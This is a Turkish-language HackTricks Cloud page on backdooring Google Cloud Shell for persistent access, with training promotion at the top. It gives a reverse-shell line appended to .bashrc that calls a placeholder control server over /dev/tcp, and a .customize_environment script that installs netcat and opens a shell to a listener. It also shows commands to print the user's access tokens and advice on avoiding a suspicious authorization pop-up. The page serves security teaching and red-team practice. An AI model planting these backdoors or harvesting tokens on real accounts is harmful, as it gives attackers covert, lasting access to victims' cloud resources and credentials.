# GCP - Cloud Shell Kalıcılığı

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Cloud Shell

Daha fazla bilgi için kontrol edin:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Kalıcı Arka Kapı

[**Google Cloud Shell**](https://cloud.google.com/shell/), tarayıcınızdan doğrudan bulut kaynaklarınıza komut satırı erişimi sağlar ve herhangi bir ek maliyet olmadan.

Google'ın Cloud Shell'ine **web konsolundan** veya **`gcloud cloud-shell ssh`** komutunu çalıştırarak erişebilirsiniz.

Bu konsolun saldırganlar için bazı ilginç yetenekleri vardır:

1. **Google Cloud'a erişimi olan herhangi bir Google kullanıcısı**, tam yetkilendirilmiş bir Cloud Shell örneğine erişebilir (Hizmet Hesapları, org'un Sahipleri bile olabilir).
2. Söz konusu örnek, **en az 120 gün boyunca ana dizinini koruyacaktır** eğer hiçbir etkinlik olmazsa.
3. Bu örneğin etkinliğini izlemek için bir organizasyonun **yetenekleri yoktur**.

Bu temelde bir saldırgan, kullanıcının ana dizinine bir arka kapı yerleştirebilir ve kullanıcı en az 120 günde bir GC Shell'e bağlandığı sürece arka kapı hayatta kalacak ve saldırgan her çalıştırıldığında bir kabuk alacaktır sadece şunu yaparak:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Ev dizininde varsa **`.customize_environment`** adında başka bir dosya bulunmaktadır ve bu dosya, kullanıcının **bulut kabuğuna** her eriştiğinde **çalıştırılacaktır** (önceki teknikte olduğu gibi). Kullanıcı "sık sık" bulut kabuğunu kullandığı sürece kalıcılığı sürdürmek için önceki arka kapıyı veya aşağıdakine benzer birini ekleyin:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
**Önemli:** Bir kimlik doğrulama gerektiren işlem **ilk kez gerçekleştirildiğinde**, kullanıcının tarayıcısında bir yetkilendirme penceresi belirir. Bu pencerenin kabul edilmesi gerekmektedir ki komut çalışabilsin. Beklenmeyen bir pencere belirirse, şüphe uyandırabilir ve kullanılan kalıcılık yöntemini tehlikeye atabilir.
{% endhint %}

Bu, bulut kabuğundan (`cloud shell`) (saldırgan olarak) `gcloud projects list` komutunu çalıştırdıktan sonra tarayıcının kullanıcı oturumunda görünen pop-up'tır:

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Ancak, kullanıcı bulut kabuğunu aktif olarak kullandıysa, pop-up belirmeyecek ve kullanıcının **token'larını toplayabilirsiniz**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSH bağlantısının nasıl kurulduğu

Temel olarak, bu 3 API çağrısı kullanılır:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (yerel olarak oluşturduğunuz genel anahtarını eklemenizi sağlar)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (örneği başlatmanızı sağlar)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (google cloud shell'in IP'sini size söyler)

Ancak daha fazla bilgiyi [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key) adresinde bulabilirsiniz.

## Referanslar

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)
